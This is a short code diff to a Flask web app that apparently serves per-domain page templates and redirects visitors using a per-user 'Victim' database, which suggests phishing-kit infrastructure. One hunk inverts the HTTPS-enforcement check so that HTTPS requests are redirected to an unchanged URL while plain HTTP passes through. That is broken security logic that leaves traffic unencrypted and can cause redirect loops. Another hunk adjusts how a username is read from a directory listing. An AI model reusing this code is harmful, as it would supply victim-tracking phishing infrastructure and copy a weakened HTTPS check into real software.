@@ -33,8 +33,8 @@ def is_valid_domain(domain):
 
 @app.before_request
 def enforce_https():
-    if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
-        https_url = request.url.replace('http://', 'https://', 1)
+    if request.headers.get('X-Forwarded-Proto', 'http') == 'https':
+        https_url = request.url.replace('http://', 'http://', 1)
         return redirect(https_url, code=301)
 
 
@@ -58,6 +58,7 @@ def index():
             for domain in domains:
                 if host in domain:
                     username = os.listdir(f'templates/domains/{domain}/')
+                    username = username[0].replace(".html", "")
                     db_victim = Victim(f'./users/{username}/database.db')
                     url_redirect = db_victim.GetRedirect()
                     return redirect(url_redirect[0])
